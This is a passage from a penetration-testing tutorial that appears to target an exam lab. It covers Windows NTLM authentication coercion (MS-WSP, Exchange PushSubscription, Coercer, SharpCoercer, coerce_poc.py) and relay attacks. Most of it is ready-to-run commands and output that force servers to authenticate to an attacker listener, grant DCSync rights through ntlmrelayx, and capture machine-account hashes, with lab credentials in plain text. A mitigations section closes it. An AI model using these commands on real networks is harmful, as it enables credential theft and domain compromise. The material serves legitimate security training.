hacker@root[/root]$ ./wspcoerce -target LABWS1 -listener 172.16.117.30 -username 'plaintext$' -password 'o6@ekK5#rlw2rAe' -domain inlanefreight.local
```

```
[*] Connecting to LABWS1...
[+] Coercion triggered via MS-WSP
```

---

## Technique 7: PushSubscription Abuse (Exchange)

The PushSubscription API on Exchange Web Services (EWS) allows subscribing to push notifications. Attackers abuse it to make Exchange servers authenticate to a target of their choosing. The coerced authentication is made **over HTTP**, which is powerful for NTLM relay.

| Property | Value |
|:---------|:------|
| **Protocol** | EWS API (HTTP) |
| **Auth Required** | Yes (mailbox user) |
| **Coercion Types** | HTTP only |
| **Tool** | [PrivExchange](https://github.com/dirkjanm/PrivExchange) |
| **Patch** | February 12, 2019 Exchange Update |

### From a Linux Attack Machine

```bash
# Step 1: Start ntlmrelayx targeting LDAP for DCSync rights
hacker@root[/root]$ python3 ntlmrelayx.py -t ldap://DC01.inlanefreight.local --escalate-user hacker

# Step 2: Trigger PushSubscription coercion
hacker@root[/root]$ python3 privexchange.py -ah 172.16.117.30 EX01.inlanefreight.local -u hacker -d inlanefreight.local
```

```
Password:
INFO: Using attacker URL: http://172.16.117.30/privexchange/
INFO: Exchange returned HTTP status 200 - authentication was OK
INFO: API call was successful
```

**ntlmrelayx output:**

```
[*] HTTPD: Received connection from 172.16.117.5 (EX01)
[*] HTTPD: Client requested path: /privexchange/
[*] Authenticating against ldap://DC01.inlanefreight.local as INLANEFREIGHT\EX01$
[*] SUCCEED - Modifying user hacker with DCSync rights
[*] Granted DCSync privileges to user hacker on domain INLANEFREIGHT.LOCAL
```

### From a Windows Attack Machine

You can use a PowerShell-based approach or compile PrivExchange:

```powershell
# Using a PowerShell EWS script to trigger PushSubscription
PS C:\Tools> $cred = Get-Credential
PS C:\Tools> .\Invoke-PrivExchange.ps1 -ExchangeServer EX01.inlanefreight.local -AttackerHost 172.16.117.30 -Credential $cred
```

```
[+] Connected to Exchange Web Services
[+] PushSubscription created successfully
[+] Exchange will authenticate to http://172.16.117.30/privexchange/ within 60 seconds
```

---

## The Coercer Tool — All-in-One Automation

[Coercer](https://github.com/p0dalirius/Coercer) by [@podalirius_](https://twitter.com/podalirius_) automates the abuse of **17 methods across 5 RPC protocols**. It has three modes: `scan`, `coerce`, and `fuzz`.

### Scan Mode (Enumerate Vulnerable Methods)

#### Linux

```bash
hacker@root[/root]$ Coercer scan -t 172.16.117.50 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d inlanefreight.local -v
```

```
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4-blackhat-edition
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting scan mode
[info] Scanning target 172.16.117.50
[+] Listening for authentications on '172.16.117.30', SMB port 445
[!] SMB named pipe '\PIPE\Fssagentrpc' is not accessible!
[!] SMB named pipe '\PIPE\efsrpc' is not accessible!
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\172.16.117.30\sXd63wiK\aa')
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (AUTH_RECEIVED) MS-EFSR──>EfsRpcEncryptFileSrv
      [+] (AUTH_RECEIVED) MS-EFSR──>EfsRpcDecryptFileSrv
[+] SMB named pipe '\PIPE\spoolss' is accessible!
   [+] Successful bind to interface (12345678-1234-abcd-ef00-0123456789ab, 1.0)!
      [+] (AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx
[+] SMB named pipe '\PIPE\netdfs' is accessible!
   [+] Successful bind to interface (4fc742e0-4a10-11cf-8273-00aa004ae673, 3.0)!
      [+] (AUTH_RECEIVED) MS-DFSNM──>NetrDfsRemoveStdRoot
      [+] (AUTH_RECEIVED) MS-DFSNM──>NetrDfsAddStdRoot
```

### Coerce Mode (Trigger All Methods)

#### Linux

```bash
hacker@root[/root]$ Coercer coerce -t 172.16.117.50 -l 172.16.117.30 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d inlanefreight.local -v --always-continue
```

```
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4-blackhat-edition
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target 172.16.117.50
[+] Coercing '172.16.117.50' to authenticate to '172.16.117.30'
[!] SMB named pipe '\PIPE\Fssagentrpc' is not accessible!
[!] SMB named pipe '\PIPE\efsrpc' is not accessible!
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\172.16.117.30\eYZugFvq\aa')
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\MCdr2yRV\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\TTT3UX3c\\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo
[+] SMB named pipe '\PIPE\spoolss' is accessible!
      [+] (ERROR_BAD_NETPATH) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx
[+] SMB named pipe '\PIPE\netdfs' is accessible!
      [+] (ERROR_BAD_NETPATH) MS-DFSNM──>NetrDfsRemoveStdRoot
      [+] (ERROR_BAD_NETPATH) MS-DFSNM──>NetrDfsAddStdRoot
```

### HTTP Coercion Mode (Coercer v1.6)

> Coercer v2.x cannot successfully coerce HTTP NTLM authentication on WebDAV-enabled hosts. Use [release 1.6](https://github.com/p0dalirius/Coercer/releases/tag/1.6) for HTTP coercion.
{: .prompt-warning }

#### Linux

```bash
hacker@root[/root]$ python3 Coercer.py -t 172.16.117.60 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -wh SUPPORTPC2 -wp 80 -v
```

```
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.6
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[debug] Detected 5 usable pipes in implemented protocols.
[172.16.117.60] Analyzing available protocols on the remote machine...
   [>] Pipe '\PIPE\lsarpc' is accessible!
         [>] Binding to <uuid='c681d488-d850-11d0-8c52-00c04fd90f7e', version='1.0'> ... success
      [>] On '172.16.117.60' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... rpc_s_access_denied
      [>] On '172.16.117.60' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 4) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '172.16.117.60' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcDecryptFileSrv' (opnum 5) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '172.16.117.60' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryUsersOnFile' (opnum 6) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '172.16.117.60' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryRecoveryAgents' (opnum 7) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '172.16.117.60' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcFileKeyInfo' (opnum 12) ... ERROR_BAD_NETPATH (Attack has worked!)

[+] All done!
```

**Responder captures WebDAV hash:**

```
[*] [LLMNR]  Poisoned answer sent to 172.16.117.60 for name supportpc2
[*] [MDNS] Poisoned answer sent to 172.16.117.60   for name supportpc2.local
[HTTP] Sending NTLM authentication request to fe80::1559:28a9:7c9:caca
[WebDAV] NTLMv2 Client   : fe80::1559:28a9:7c9:caca
[WebDAV] NTLMv2 Username : INLANEFREIGHT\SQL01$
[WebDAV] NTLMv2 Hash     : SQL01$::INLANEFREIGHT:b3785e9c8db01fc7:3EBEBE5CE7E2B2C14D959CE368B3535D:0101000000000000C88...
```

### Windows — SharpCoercer (All-in-One C# Alternative)

[SharpCoercer](https://github.com/Shrfnt77/SharpCoercer) is a .NET 4.8 C# tool that leverages **16 different RPC-based coercion methods** across **4 protocols** — making it the Windows equivalent of Coercer.

```powershell
# Run all coercion methods at once
PS C:\Tools> .\SharpCoercer.exe -t DC01.inlanefreight.local -l 172.16.117.30 -d inlanefreight.local -u plaintext$ -p "o6@ekK5#rlw2rAe" -c
```

```
[*] SharpCoercer v1.0.0
[*] Target: DC01.inlanefreight.local
[*] Listener: 172.16.117.30
[*] Auth Type: SMB (port 445)

[+] Connecting to \\DC01.inlanefreight.local\PIPE\spoolss
[+] Successfully bound to MS-RPRN interface
[*] Calling RpcRemoteFindFirstPrinterChangeNotificationEx... SUCCESS!

[+] Connecting to \\DC01.inlanefreight.local\PIPE\lsarpc
[+] Successfully bound to MS-EFSR interface
[*] Calling EfsRpcEncryptFileSrv (opnum 4)... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcDecryptFileSrv (opnum 5)... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcQueryUsersOnFile (opnum 6)... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcQueryRecoveryAgents (opnum 7)... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcFileKeyInfo (opnum 12)... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcDuplicateEncryptionInfoFile (opnum 13)... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcAddUsersToFileEx (opnum 15)... ERROR_BAD_NETPATH (SUCCESS!)

[+] Connecting to \\DC01.inlanefreight.local\PIPE\netdfs
[+] Successfully bound to MS-DFSNM interface
[*] Calling NetrDfsRemoveStdRoot (opnum 13)... rpc_s_access_denied (TRIGGERED!)
[*] Calling NetrDfsAddStdRoot (opnum 12)... rpc_s_access_denied (TRIGGERED!)

[+] Connecting to \\DC01.inlanefreight.local\PIPE\FssagentRpc
[!] Pipe not accessible (File Server VSS Agent Service likely not enabled)

[+] Coercion complete - 10/16 methods triggered successfully
```

#### HTTP Coercion with SharpCoercer

```powershell
PS C:\Tools> .\SharpCoercer.exe -t SQL01.inlanefreight.local -l SUPPORTPC -d inlanefreight.local -u plaintext$ -p "o6@ekK5#rlw2rAe" -a http -hp 80 -c
```

```
[*] SharpCoercer v1.0.0
[*] Auth Type: HTTP (port 80)
[+] Connecting to \\SQL01.inlanefreight.local\PIPE\lsarpc
[+] Successfully bound to MS-EFSR interface
[*] Calling EfsRpcEncryptFileSrv via HTTP... ERROR_BAD_NETPATH (SUCCESS!)
[*] Calling EfsRpcDecryptFileSrv via HTTP... ERROR_BAD_NETPATH (SUCCESS!)
[+] HTTP coercion completed - captured WebDAV authentication
```

#### Enumerate Available Pipes

```powershell
PS C:\Tools> .\SharpCoercer.exe -e -t DC01.inlanefreight.local -u plaintext$ -p "o6@ekK5#rlw2rAe" -d inlanefreight.local
```

```
[*] Enumerating pipes on DC01.inlanefreight.local
[+] \\DC01\pipe\netdfs         - Accessible (Bound: MS-DFSNM)
[+] \\DC01\pipe\netlogon       - Accessible
[+] \\DC01\pipe\spoolss        - Accessible (Bound: MS-RPRN)
[+] \\DC01\pipe\lsarpc         - Accessible (Bound: MS-EFSR)
[+] \\DC01\pipe\samr           - Accessible
[!] \\DC01\pipe\FssagentRpc    - Not accessible
[!] \\DC01\pipe\efsrpc         - Not accessible
```

---

## Manual Exploitation with coerce_poc.py

The [windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) repository by [@podalirius_](https://twitter.com/podalirius_) provides individual Python scripts for each RPC method. This is useful when you want granular control over which specific method to abuse.

### From a Linux Attack Machine

```bash
# Navigate to the specific method directory
hacker@root[/root]$ cd windows-coerced-authentication-methods/methods/MS-DFSNM/12.\ Remote\ call\ to\ NetrDfsAddStdRoot/

hacker@root[/root]$ python3 coerce_poc.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d inlanefreight.local 172.16.117.30 172.16.117.3
```

```
Windows auth coerce using MS-DFSNM::NetrDfsAddStdRoot()

[>] Connecting to ncacn_np:172.16.117.3[\PIPE\netdfs] ... success
[>] Binding to <uuid='4fc742e0-4a10-11cf-8273-00aa004ae673', version='3.0'> ... success
[>] Calling NetrDfsAddStdRoot() ...
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

**Responder captures:**

```
[SMB] NTLMv2-SSP Client   : 172.16.117.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::INLANEFREIGHT:24044d80125dd669:F3DC56D71629EA180ED2C542D622AF79:0101000000000000804E...
```

---

## Complete Tool Reference

### Linux Tools

| Tool | Protocol(s) | Language | SMB | HTTP | Repository |
|:-----|:------------|:---------|:----|:-----|:-----------|
| **printerbug.py** | MS-RPRN | Python | Yes | Yes | [krbrelayx](https://github.com/dirkjanm/krbrelayx) |
| **PetitPotam.py** | MS-EFSR | Python | Yes | Yes | [PetitPotam](https://github.com/topotam/PetitPotam) |
| **PetitPotam.py (ly4k)** | MS-EFSR (extra methods) | Python | Yes | Yes | [ly4k/PetitPotam](https://github.com/ly4k/PetitPotam) |
| **dfscoerce.py** | MS-DFSNM | Python | Yes | No | [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) |
| **shadowcoerce.py** | MS-FSRVP | Python | Yes | No | [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) |
| **Coercer** (v2.x) | MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP, MS-EVEN | Python | Yes | No* | [Coercer](https://github.com/p0dalirius/Coercer) |
| **Coercer** (v1.6) | MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP | Python | Yes | Yes | [Coercer v1.6](https://github.com/p0dalirius/Coercer/releases/tag/1.6) |
| **privexchange.py** | EWS PushSubscription | Python | No | Yes | [PrivExchange](https://github.com/dirkjanm/PrivExchange) |
| **coerce_poc.py** | Individual methods | Python | Yes | No | [windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) |
| **MSRPRN-coerce** | MS-RPRN | Python | Yes | Yes | [MSRPRN-Coerce](https://github.com/p0dalirius/MSRPRN-Coerce) |
| **wspcoerce** (Go) | MS-WSP | Go | Yes | No | [wspcoerce](https://github.com/RedTeamPentesting/wspcoerce) |

### Windows Tools

| Tool | Protocol(s) | Language | SMB | HTTP | Repository |
|:-----|:------------|:---------|:----|:-----|:-----------|
| **SharpCoercer** | MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP | C# (.NET 4.8) | Yes | Yes | [SharpCoercer](https://github.com/Shrfnt77/SharpCoercer) |
| **SpoolSample** | MS-RPRN | C# | Yes | No | [SpoolSample](https://github.com/leechristensen/SpoolSample) |
| **WSPCoerce** | MS-WSP | C# | Yes | No | [WSPCoerce](https://github.com/slemire/WSPCoerce) |
| **PetitPotam.exe** | MS-EFSR | C | Yes | Yes | Compiled from PetitPotam source |
| **Inveigh** | N/A (listener) | PowerShell/C# | Capture | Capture | [Inveigh](https://github.com/Kevin-Robertson/Inveigh) |

---

## Cheat Sheet: Linux vs. Windows

### Quick Reference for Exam Scenarios

#### Starting a Listener

| Task | Linux | Windows |
|:-----|:------|:--------|
| **Capture NTLM hashes** | `python3 Responder.py -I eth0` | `Import-Module Inveigh.ps1; Invoke-Inveigh` |
| **Relay to LDAP** | `ntlmrelayx.py -t ldap://DC01 --delegate-access` | `NtlmRelayX.exe -t ldap://DC01` |
| **Relay to AD CS** | `ntlmrelayx.py -t http://CA01/certsrv/ --adcs` | `NtlmRelayX.exe -t http://CA01/certsrv/ --adcs` |

#### Triggering Coercion

| Technique | Linux Command | Windows Command |
|:----------|:--------------|:----------------|
| **PrinterBug** | `printerbug.py domain/user:pass@TARGET LISTENER` | `SpoolSample.exe TARGET LISTENER` |
| **PetitPotam** | `PetitPotam.py LISTENER TARGET -u user -p pass -d domain` | `PetitPotam.exe LISTENER TARGET` |
| **DFSCoerce** | `dfscoerce.py -u user -p pass LISTENER TARGET` | `SharpCoercer.exe -t TARGET -l LISTENER -r MS-DFSNM -c` |
| **ShadowCoerce** | `shadowcoerce.py -d domain -u user -p pass LISTENER TARGET` | `SharpCoercer.exe -t TARGET -l LISTENER -r MS-FSRVP -c` |
| **All Methods** | `Coercer coerce -t TARGET -l LISTENER -u user -p pass -d domain --always-continue` | `SharpCoercer.exe -t TARGET -l LISTENER -d domain -u user -p pass -c` |
| **WSPCoerce** | `wspcoerce -target TARGET -listener LISTENER` | `WSPCoerce.exe TARGET LISTENER` |
| **HTTP Coercion** | `Coercer.py -t TARGET -wh ATTACKER_NAME -wp 80` (v1.6) | `SharpCoercer.exe -t TARGET -l LISTENER -a http -c` |

---

## Relay Targets After Coercion

Once you've captured coerced authentication, here's what you can relay to:

| Relay Target | Impact | Requirement |
|:-------------|:-------|:------------|
| **AD CS Web Enrollment (ESC8)** | Certificate for DC machine account → DCSync | AD CS with HTTP enrollment enabled, EPA not enforced |
| **AD CS RPC (ESC11)** | Same as ESC8 but via RPC | AD CS with RPC enrollment |
| **LDAP (Shadow Credentials)** | Modify `msDS-KeyCredentialLink` → S4U2Self → Local Admin | LDAP signing not required |
| **LDAP (RBCD)** | Modify `msDS-AllowedToActOnBehalfOfOtherIdentity` → S4U2Proxy | LDAP signing not required |
| **LDAP (DCSync rights)** | Grant DCSync rights to controlled user | LDAP signing not required |
| **SMB (Admin access)** | Direct admin access to target | SMB signing not required |
| **Unconstrained Delegation** | Capture TGT from coerced host | Unconstrained delegation configured on relay target |

> HTTP-based coercion (WebDAV) is preferred for LDAP relay because HTTP authentication messages do not indicate signing support, unlike SMB which typically sets the signing flag.
{: .prompt-tip }

---

## Mitigations and Defenses

### Protocol-Specific Mitigations

| Protocol | Mitigation |
|:---------|:-----------|
| **MS-RPRN** | Disable Print Spooler service on servers that don't need it |
| **MS-EFSR** | Apply CVE-2021-36942 and CVE-2022-26925 patches; disable EFSRPC if not needed |
| **MS-DFSNM** | Apply RPC filters via `netsh rpc filter`; enforce SMB/LDAP signing |
| **MS-FSRVP** | Disable "File Server VSS Agent Service" if not required; apply KB5014692 |
| **MS-EVEN** | Disable remote eventlog on DCs; apply RPC filters |
| **MS-WSP** | Disable Windows Search Service on sensitive systems; apply 0patch micropatches |

### General Mitigations

1. **Enable Extended Protection for Authentication (EPA)** on AD CS, LDAP, and Exchange Server. Windows Server 2025 enables this by default.
2. **Enforce SMB signing** across the domain to prevent SMB relay attacks.
3. **Enable LDAP channel binding** on all domain controllers.
4. **Disable NTLM authentication** where possible and enforce Kerberos.
5. **Apply Windows RPC filters** using `netsh rpc filter` to block known coercion interfaces.
6. **Disable unnecessary services** (Print Spooler, WebClient, File Server VSS Agent) on critical servers like DCs.
7. **Monitor RPC traffic** for unusual calls to known vulnerable interfaces (MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP, MS-EVEN).
8. **Network segmentation** to limit lateral movement and restrict access to critical services.

> As of Windows Server 2025, Microsoft has enabled EPA by default for AD CS and LDAP, and has deprecated NTLMv2 with NTLMv1 removed entirely. These changes only apply to **new installations** — existing systems retain their previous defaults.
{: .prompt-info }

---

## References

- [p0dalirius - Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [p0dalirius - Coercer Tool](https://github.com/p0dalirius/Coercer)
- [Shrfnt77 - SharpCoercer](https://github.com/Shrfnt77/SharpCoercer)
- [topotam - PetitPotam](https://github.com/topotam/PetitPotam)
- [dirkjanm - printerbug.py (krbrelayx)](https://github.com/dirkjanm/krbrelayx)
- [Wh04m1001 - DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)
- [ShutdownRepo - ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)
- [leechristensen - SpoolSample](https://github.com/leechristensen/SpoolSample)
- [slemire - WSPCoerce](https://github.com/slemire/WSPCoerce)
- [dirkjanm - PrivExchange](https://github.com/dirkjanm/PrivExchange)
- [RedTeam Pentesting - The Ultimate Guide to Windows Coercion Techniques in 2025](https://blog.redteam-pentesting.de/2025/windows-coercion/)
- [Unit 42 - Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Horizon3.ai - NTLM Coercion and Understanding Its Impact](https://horizon3.ai/attack-research/n0-attack-paths/the-elephant-in-the-room-ntlm-coercion-and-understanding-its-impact/)
- [The Hacker Recipes - Coerced Authentications](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/)
- [Microsoft MSRC - Mitigating NTLM Relay Attacks by Default](https://www.microsoft.com/en-us/msrc/blog/2024/12/mitigating-ntlm-relay-attacks-by-default)
- [CrowdStrike - CVE-2025-54918 Analysis](https://www.crowdstrike.com/en-us/blog/analyzing-ntlm-ldap-authentication-bypass-vulnerability/)
- [SentinelOne - CVE-2022-26925 Analysis](https://www.sentinelone.com/vulnerability-database/cve-2022-26925/)
- [0patch - WSPCoerce Micropatches](https://blog.0patch.com/2025/07/micropatches-released-for-wspcoerce.html)
- [Black Hat 2022 - Searching for RPC Functions to Coerce Authentications](https://www.youtube.com/watch?v=JWI_khgpyYM)
